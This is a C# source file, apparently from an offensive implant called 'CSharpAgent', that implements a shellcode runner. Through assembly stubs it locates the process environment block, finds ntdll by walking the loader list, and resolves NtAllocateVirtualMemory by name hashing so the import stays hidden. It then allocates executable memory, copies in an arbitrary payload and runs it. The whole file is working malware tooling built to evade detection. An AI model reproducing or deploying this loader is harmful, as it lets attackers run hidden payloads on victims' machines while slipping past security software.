using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    internal static class ShellcodeRunner
    {
        internal static void RunPayload(byte[] bytes)
        {
            // Detect native ARM64 at runtime so the correct execution stub is selected. IntPtr.Size
            // alone can't separate ARM64 from x64 (both 8), so we also check the system arch.
            SYSTEM_INFO sysInfo;
            NativeImports.GetNativeSystemInfo(out sysInfo);
            bool isArm64 = sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8;

            byte[] asm;
            if (isArm64)
                // mov x0, x18; ret
                asm = new byte[] { 0xE0, 0x03, 0x12, 0xAA, 0xC0, 0x03, 0x5F, 0xD6 };
            else if (IntPtr.Size == 8)
                // mov rax, qword ptr gs:[0x30]; ret
                asm = new byte[] { 0x65, 0x48, 0xA1, 0x30, 0, 0, 0, 0, 0, 0, 0, 0xC3 };
            else
                // mov eax, dword ptr fs:[0x18]; ret
                asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };

            IntPtr ptr = Marshal.AllocHGlobal(asm.Length);
            Marshal.Copy(asm, 0, ptr, asm.Length);

            uint oldProtect;
            NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect);

            if (isArm64)
                NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);

            var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
            IntPtr tebAddress = getTEB();

            NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
            Marshal.FreeHGlobal(ptr);

            IntPtr pebAddress = Marshal.ReadIntPtr(IntPtrAdd(tebAddress, IntPtr.Size == 8 ? 0x60 : 0x30));
            IntPtr loaderDataAddress = Marshal.ReadIntPtr(IntPtrAdd(pebAddress, IntPtr.Size == 8 ? 0x18 : 0x0C));
            IntPtr inMemoryOrderModuleList = IntPtrAdd(loaderDataAddress, IntPtr.Size == 8 ? 0x20 : 0x14);

            IntPtr firstEntry = Marshal.ReadIntPtr(inMemoryOrderModuleList);
            IntPtr secondEntry = Marshal.ReadIntPtr(firstEntry);

            IntPtr ntdllHandle = Marshal.ReadIntPtr(IntPtrAdd(secondEntry, IntPtr.Size == 8 ? 32 : 16));
            IntPtr ntAllocatePtr = GetProcAddressByHash(ntdllHandle, 3580609816);

            var ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntAllocatePtr, typeof(NtAllocateVirtualMemory));

            IntPtr pMemory = IntPtr.Zero;
            UIntPtr regionSize = (UIntPtr)bytes.Length;

            ntAllocateVirtualMemory(
                new IntPtr(-1),
                ref pMemory,
                IntPtr.Zero,
                ref regionSize,
                0x1000 | 0x2000,
                0x40
            );

            Marshal.Copy(bytes, 0, pMemory, bytes.Length);

            if (isArm64)
                NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);

            IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
            Parameters parameters = new Parameters
            {
                InjectorVersion = uint.MaxValue,
                InjectorCompilationType = 100
            };
            Marshal.StructureToPtr(parameters, parametersMemory, false);

            int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
            Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);

            var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
            entry(uint.MaxValue);

            Marshal.FreeHGlobal(parametersMemory);
        }

        internal static IntPtr IntPtrAdd(IntPtr p0, int p1)
        {
            return new IntPtr((IntPtr.Size == 8 ? p0.ToInt64() : p0.ToInt32()) + p1);
        }

        internal static IntPtr GetProcAddressByHash(IntPtr hModule, uint eHash)
        {
            int e_lfanew = Marshal.ReadInt32(IntPtrAdd(hModule, 0x3C));
            int optionalHeaderOffset = e_lfanew + (IntPtr.Size == 8 ? 0x88 : 0x78);
            int exportTableRVA = Marshal.ReadInt32(IntPtrAdd(hModule, optionalHeaderOffset));

            IntPtr exportTable = IntPtrAdd(hModule, exportTableRVA);

            int numberOfNames = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x18));
            int addressOfFunctions = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x1C));
            int addressOfNames = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x20));
            int addressOfNameOrdinals = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x24));

            IntPtr namesPtr = IntPtrAdd(hModule, addressOfNames);
            IntPtr ordinalsPtr = IntPtrAdd(hModule, addressOfNameOrdinals);
            IntPtr functionsPtr = IntPtrAdd(hModule, addressOfFunctions);

            for (int i = 0; i < numberOfNames; i++)
            {
                uint cHash = 77777;

                IntPtr nameRVA = IntPtrAdd(namesPtr, i * 4);
                IntPtr namePtr = IntPtrAdd(hModule, Marshal.ReadInt32(nameRVA));
                string functionName = Marshal.PtrToStringAnsi(namePtr);

                for (int j = 0; j < functionName.Length; j++)
                {
                    char c = functionName[j];
                    if (c >= 65 && c <= 90) c += (char)32;
                    cHash = ((cHash << 5) + cHash) + c;
                }

                if (cHash == eHash)
                {
                    IntPtr ordinalPtr = IntPtrAdd(ordinalsPtr, i * 2);
                    ushort ordinal = (ushort)Marshal.ReadInt16(ordinalPtr);

                    IntPtr functionRVA = IntPtrAdd(functionsPtr, ordinal * 4);
                    uint functionOffset = (uint)Marshal.ReadInt32(functionRVA);
                    return IntPtrAdd(hModule, (int)functionOffset);
                }
            }

            return IntPtr.Zero;
        }
    }
}
